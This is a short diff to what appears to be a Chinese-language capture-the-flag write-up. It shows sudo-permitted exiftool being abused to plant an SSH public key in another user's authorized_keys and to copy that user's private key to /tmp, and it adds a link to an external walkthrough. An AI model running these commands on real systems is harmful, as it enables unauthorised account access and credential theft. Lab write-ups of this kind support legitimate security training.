@@ -108,7 +108,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjEN
 sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
 ```
 
+https://medium.com/@josemlwdf/thewall-eb99f02e1502
+
 换一个思路读取ssh私钥
 ```c
 sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa
 ```
+
+sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/authorized_keys
